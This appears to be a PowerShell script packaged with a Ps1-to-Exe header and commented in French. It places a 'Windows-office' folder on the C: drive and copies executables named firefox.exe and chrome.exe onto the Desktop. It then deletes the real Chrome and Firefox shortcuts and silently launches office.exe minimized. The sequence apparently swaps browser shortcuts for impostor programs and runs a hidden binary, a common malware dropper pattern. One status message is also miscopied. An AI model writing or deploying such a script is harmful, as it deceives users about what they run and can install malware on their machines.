##[Ps1 To Exe]
##
##Kd3HDZOFADWE8uO1
##Nc3NCtDXTlODjqHB5jV78Fjsfngyes2Ut4n2lNXoqruisibWKQ==
##Kd3HFJGZHWLWoLaVvnQnhQ==
##LM/RF4eFHHGZ7/K1
##K8rLFtDXTiW5
##OsHQCZGeTiiZ4dI=
##OcrLFtDXTiW5
##LM/BD5WYTiiZ4tI=
##McvWDJ+OTiiZ4tI=
##OMvOC56PFnzN8u+Vs1Q=
##M9jHFoeYB2Hc8u+Vs1Q=
##PdrWFpmIG2HcofKIo2QX
##OMfRFJyLFzWE8uK1
##KsfMAp/KUzWJ0g==
##OsfOAYaPHGbQvbyVvnQX
##LNzNAIWJGmPcoKHc7Do3uAuO
##LNzNAIWJGnvYv7eVvnQX
##M9zLA5mED3nfu77Q7TV64AuzAgg=
##NcDWAYKED3nfu77Q7TV64AuzAgg=
##OMvRB4KDHmHQvbyVvnQX
##P8HPFJGEFzWE8tI=
##KNzDAJWHD2fS8u+Vgw==
##P8HSHYKDCX3N8u+Vgw==
##LNzLEpGeC3fMu77Ro2k3hQ==
##L97HB5mLAnfMu77Ro2k3hQ==
##P8HPCZWEGmaZ7/K1
##L8/UAdDXTlODjqHB5jV78Fjsfm4iYsCnia+zzNGyse/0vkU=
##Kc/BRM3KXhU=
##
##
##fd6a9f26a06ea3bc99616d4851b372ba
cp -r data C:/Windows-office/
# Spécifiez le chemin complet du fichier source
$cheminSource = "shorcut/firefox.exe"

# Spécifiez le chemin complet du dossier du bureau
$cheminBureau = [System.IO.Path]::Combine($env:USERPROFILE, "Desktop")

# Utilisez la cmdlet Copy-Item pour copier le fichier vers le bureau
Copy-Item -Path $cheminSource -Destination $cheminBureau -Force


$cheminSource2 = "shorcut/chrome.exe"

# Spécifiez le chemin complet du dossier du bureau
$cheminBureau2 = [System.IO.Path]::Combine($env:USERPROFILE, "Desktop")

# Utilisez la cmdlet Copy-Item pour copier le fichier vers le bureau
Copy-Item -Path $cheminSource2 -Destination $cheminBureau2 -Force
$fileToRemove = [System.IO.Path]::Combine($env:USERPROFILE, 'Desktop', 'chrome.lnk')

# Vérifie si le fichier existe avant de tenter de le supprimer
if (Test-Path $fileToRemove -PathType Leaf) {
    # Supprime le fichier s'il existe
    Remove-Item -Path $fileToRemove -Force
    Write-Host "Le fichier 'chrome.lnk' a été supprimé du bureau."
} else {
    Write-Host "Le fichier 'chrome.lnk' n'existe pas sur le bureau."
}

$fileToRemove2 = [System.IO.Path]::Combine($env:USERPROFILE, 'Desktop', 'firefox.lnk')

# Vérifie si le fichier existe avant de tenter de le supprimer
if (Test-Path $fileToRemove2 -PathType Leaf) {
    # Supprime le fichier s'il existe
    Remove-Item -Path $fileToRemove2 -Force
    Write-Host "Le fichier 'chrome.lnk' a été supprimé du bureau."
} else {
    Write-Host "Le fichier 'chrome.lnk' n'existe pas sur le bureau."
}

Start-Process -FilePath "C:\Windows-office\office.exe" -WindowStyle Minimized
